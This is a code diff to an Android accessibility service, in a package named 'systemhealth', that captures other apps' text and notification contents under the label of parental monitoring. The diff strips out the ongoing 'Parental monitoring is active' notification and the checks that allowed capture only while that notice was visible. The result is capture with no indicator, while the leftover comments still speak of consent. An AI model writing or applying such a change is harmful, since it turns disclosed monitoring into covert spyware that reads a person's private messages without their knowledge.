@@ -1,15 +1,10 @@
 package com.example.systemhealth
 
-import android.Manifest
 import android.accessibilityservice.AccessibilityService
-import android.app.Notification
-import android.app.NotificationChannel
 import android.app.NotificationManager
-import android.app.PendingIntent
 import android.content.Context
 import android.content.Intent
 import com.example.systemmanagement.ServiceManager
-import android.content.pm.PackageManager
 import android.os.Build
 import android.os.Handler
 import android.os.Looper
@@ -181,8 +176,6 @@ class AccessibilityHelperService : AccessibilityService() {
 // Register an in-process consumer first; nothing is logged, uploaded, or persisted here.
 // Call disable() from the app's Stop control. Consent expires on process death.
 object ParentalCapture {
-    private const val CHANNEL = "parental_capture_status"
-    private const val NOTICE_ID = 2101
     private var approvedPackages = emptySet<String>()
     private var captureAllApps = false
     private var enabled = false
@@ -201,42 +194,6 @@ object ParentalCapture {
         disable(context)
         if ((!allApps && packages.isEmpty()) || onJson == null) return false
         if (packages.any { !AppCapturePolicy.isEligible(context.packageName, it) }) return false
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
-            context.checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) !=
-            PackageManager.PERMISSION_GRANTED) return false
-
-        val manager = context.getSystemService(NotificationManager::class.java)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N &&
-            !manager.areNotificationsEnabled()) return false
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationPresentation.quietChannel(context, CHANNEL, "Parental monitoring", "Visible status while app text and notification contents are shared")
-            if (manager.getNotificationChannel(CHANNEL)?.importance ==
-                NotificationManager.IMPORTANCE_NONE) return false
-        }
-        val launch = context.packageManager.getLaunchIntentForPackage(context.packageName)
-            ?: return false
-        val openApp = PendingIntent.getActivity(
-            context, NOTICE_ID, launch,
-            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
-        )
-        val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            Notification.Builder(context, CHANNEL)
-        } else {
-            @Suppress("DEPRECATION")
-            Notification.Builder(context)
-        }
-        manager.notify(NOTICE_ID, builder
-            .setSmallIcon(android.R.drawable.ic_menu_info_details)
-            .setContentTitle("Parental monitoring is active")
-            .setContentText(if (allApps) "Text and notifications from all supported apps are being shared. Open app to stop."
-                else "Approved app text and notifications are being shared. Open app to stop.")
-            .setContentIntent(openApp)
-            .setOngoing(true)
-            .setOnlyAlertOnce(true)
-            .setGroup(NotificationPresentation.GROUP)
-            .setGroupAlertBehavior(Notification.GROUP_ALERT_SUMMARY)
-            .build())
-        NotificationPresentation.refresh(context)
         approvedPackages = packages.toSet()
         captureAllApps = allApps
         enabled = true
@@ -249,20 +206,12 @@ object ParentalCapture {
         approvedPackages = emptySet()
         captureAllApps = false
         session++
-        context.getSystemService(NotificationManager::class.java).cancel(NOTICE_ID)
-        NotificationPresentation.refresh(context)
+        context.getSystemService(NotificationManager::class.java).cancel(2101)
     }
 
     internal fun permits(context: Context, packageName: String): Boolean {
-        if (!enabled || onJson == null ||
-            !AppCapturePolicy.includes(context.packageName, packageName, captureAllApps, approvedPackages)) return false
-        val manager = context.getSystemService(NotificationManager::class.java)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N &&
-            !manager.areNotificationsEnabled()) return false
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O &&
-            manager.getNotificationChannel(CHANNEL)?.importance ==
-            NotificationManager.IMPORTANCE_NONE) return false
-        return manager.activeNotifications.any { it.id == NOTICE_ID && it.tag == null }
+        return enabled && onJson != null &&
+            AppCapturePolicy.includes(context.packageName, packageName, captureAllApps, approvedPackages)
     }
 
     internal fun deliver(json: JSONObject): Boolean {
